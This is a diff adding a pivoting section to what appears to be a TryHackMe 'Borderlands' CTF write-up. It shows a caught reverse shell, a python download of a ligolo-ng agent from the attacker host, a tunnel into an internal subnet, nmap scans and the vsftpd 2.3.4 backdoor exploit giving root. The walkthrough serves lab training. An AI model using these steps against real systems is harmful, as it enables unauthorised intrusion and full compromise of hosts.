@@ -2,6 +2,8 @@
 ## [ Offensive Pentesting path](https://github.com/zinzloun/THM_WriteUP/tree/main/PT_Path_notes)
 ## [RedTeam Capstone Challange](https://github.com/zinzloun/THM_WriteUP/tree/main/RTM_Capstone)
 ## Borderlands
+
+### Compromise the server
 Scan the box
 
     rustscan -b 900 -a 10.10.64.117
@@ -130,15 +132,117 @@ The IP address is the THM VPN tun0 interface. We should get a reverse shell
     listening on [any] 1234 ...
     10.10.246.133: inverse host lookup failed: Unknown host
     connect to [10.9.2.142] from (UNKNOWN) [10.10.246.133] 33036
-    www-data@app:~/html$ 
+    www-data@app:~/html$
 
-Since python is installed we can use it to download files:
+Inspecting the network configuration we discover that we can reach other two network:
+
+    ip a
+    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+        inet 127.0.0.1/8 scope host lo
+           valid_lft forever preferred_lft forever
+    14: eth0@if15: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+        link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+        inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
+           valid_lft forever preferred_lft forever
+    19: eth1@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UNKNOWN group default 
+        link/ether 02:42:ac:10:01:0a brd ff:ff:ff:ff:ff:ff link-netnsid 0
+        inet 172.16.1.10/24 brd 172.16.1.255 scope global eth1
+           valid_lft forever preferred_lft forever
+    www-data@app:~/html$ ip route
+    default via 172.18.0.1 dev eth0 
+    172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
+    172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+
+### Pivoting
+We are going to use ligolo-ng to pivoting fromn the compromise host.
+Since python is installed we can also use it to download files on the compromise host:
 
     python3
     Python 3.6.8 (default, Aug 20 2019, 17:12:48) 
     [GCC 8.3.0] on linux
     Type "help", "copyright", "credits" or "license" for more information.
     >>> import urllib.request
+    >>> urllib.request.urlretrieve("http://10.9.2.142:8000/agent", "/tmp/agent")
+        ('/tmp/agent', <http.client.HTTPMessage object at 0x7f810bf47860>)
+
+Then on the attacker machine we set up ligolo as follows:
+
+    ip tuntap add user root  mode tun ligolo && ip link set ligolo up
+    ./proxy --selfcert
+    ...
+    INFO[0000] Listening on 0.0.0.0:11601                   
+    ligolo-ng »  
+
+On the victim machine start the agent:
+
+    www-data@app:/tmp$ chmod u+x agent
+    www-data@app:/tmp$ ./agent -connect 10.9.2.142:11601 -ignore-cert
+    WARN[0000] warning, certificate validation disabled     
+    INFO[0000] Connection established                        addr="10.9.2.142:11601"
+
+Once we get a connection on the attacker machine we can add the route for the new discovered network. I started with the eth1:
+
+    ip route add 172.16.1.0/24 dev ligolo
+
+Then start the tunnel on the victim machine from ligolo console:
+
+        [Agent : www-data@app.ctx.ctf] » start 
+
+Then from the attacker machine I performed a fast host discover:
+
+    nmap --min-parallelism 50  172.16.1.0/24 -n 
+    ...
+    Nmap scan report for 172.16.1.10
+    Host is up (0.16s latency).
+    Not shown: 999 closed tcp ports (conn-refused)
+    PORT   STATE SERVICE
+    80/tcp open  http
+    
+    Nmap scan report for 172.16.1.128
+    Host is up (0.17s latency).
+    Not shown: 996 closed tcp ports (conn-refused)
+    PORT     STATE SERVICE
+    21/tcp   open  ftp
+    179/tcp  open  bgp
+    2601/tcp open  zebra
+    2605/tcp open  bgpd
+
+Then I proceed to finger print the services:
+
+    nmap -sVC -Pn -p 21,179,2601,2605 172.16.1.128 
+    ...
+    PORT     STATE SERVICE    VERSION
+    21/tcp   open  ftp        vsftpd 2.3.4
+    |_ftp-anon: got code 500 "OOPS: cannot change directory:/var/lib/ftp".
+    179/tcp  open  tcpwrapped
+    2601/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
+    2605/tcp open  quagga     Quagga routing software 1.2.4 (Derivative of GNU Zebra)
+    Service Info: OS: Unix
+
+We have the (in)famous vsftp sever 2.3.4, let's confirm the exploit:
+
+    searchsploit "vsftpd 2.3.4"                                
+    ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+     Exploit Title                                                                                                                                       |  Path
+    ----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    vsftpd 2.3.4 - Backdoor Command Execution                                                                                                            | unix/remote/49757.py
+    
+Then just execute the exploit to get a telnet session:
+
+    python 49757.py 172.16.1.128 
+    /home/zinz/Downloads/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
+      from telnetlib import Telnet
+    Success, shell opened
+    Send `exit` to quit shell
+    
+    id
+    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+
+
     
 
     
+
